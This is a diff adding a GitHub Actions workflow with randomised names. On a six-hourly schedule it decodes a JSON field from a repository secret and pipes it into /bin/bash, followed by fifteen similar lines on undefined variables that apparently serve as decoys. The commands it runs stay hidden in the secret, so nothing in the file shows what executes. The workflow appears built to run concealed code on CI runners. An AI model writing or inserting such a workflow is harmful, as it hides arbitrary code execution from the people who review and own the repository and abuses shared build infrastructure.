@@ -1,0 +1,33 @@
+name: zigzagblitzen
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zigzagblitzen
+        env:
+          s84: ${{ secrets.s84 }}
+        run: |
+          echo $s84 | jq -r .don5429 | /bin/bash
+          echo $bmhwx8406 | jq -r .rvtb7776 | /bin/bash
+          echo $jy27 | jq -r .x176 | /bin/bash
+          echo $v61511 | jq -r .wj5 | /bin/bash
+          echo $ma1563 | jq -r .t6607 | /bin/bash
+          echo $vicr9 | jq -r .xzvf694 | /bin/bash
+          echo $wnqe88739 | jq -r .rfkzh2181 | /bin/bash
+          echo $wsxss8944 | jq -r .b89695 | /bin/bash
+          echo $mwc63246 | jq -r .op15 | /bin/bash
+          echo $tj2938 | jq -r .edjh387 | /bin/bash
+          echo $a6703 | jq -r .pkxh9336 | /bin/bash
+          echo $evwel41226 | jq -r .yja85 | /bin/bash
+          echo $gjoqd785 | jq -r .mah3490 | /bin/bash
+          echo $vrdo417 | jq -r .b65998 | /bin/bash
+          echo $nlvmm88937 | jq -r .hqd39 | /bin/bash
+          echo $f12 | jq -r .fin730 | /bin/bash
+
